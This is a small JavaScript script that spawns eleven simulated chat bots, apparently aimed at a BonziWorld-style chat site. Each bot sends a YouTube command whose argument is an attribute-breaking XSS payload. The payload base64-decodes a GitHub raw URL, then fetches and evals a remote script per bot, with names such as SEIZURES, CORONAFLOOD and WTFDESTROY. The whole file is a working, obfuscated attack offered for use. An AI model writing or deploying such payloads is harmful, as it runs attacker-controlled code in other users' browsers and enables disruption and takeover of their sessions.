function createSocketBots() {
  const botNames = [
    "ANANASORANG",
    "BALDIGLITCH",
    "CORONAFLOOD",
    "DOMINO",
    "GAMEBOY",
    "IVORYNUKE",
    "LOSK",
    "SEIZURES",
    "WEBDRIVER",
    "WTFDESTROY",
    "BAN",
  ];

  for (let i = 0; i < 11; i++) {
    const socket = {
      emit: function (eventName, data) {
        console.log(`Socket ${i + 1} emitted: ${eventName}`, data);
      },
    };

    socket.emit("client", "MAIN");
    socket.emit("login", { name: "IVORYCombined" });

    setTimeout(() => {
      socket.emit("talk", { text: "i always come back" });

      const payload = {
          list: [`youtube`, `71Uyt5tTnyg" onload="fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'${botNames[i]}'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))" u="`]
      };

      setTimeout(() => {socket.emit("command", payload);}, 2000);

    }, 2000); // 2 seconds
  }
}

createSocketBots();
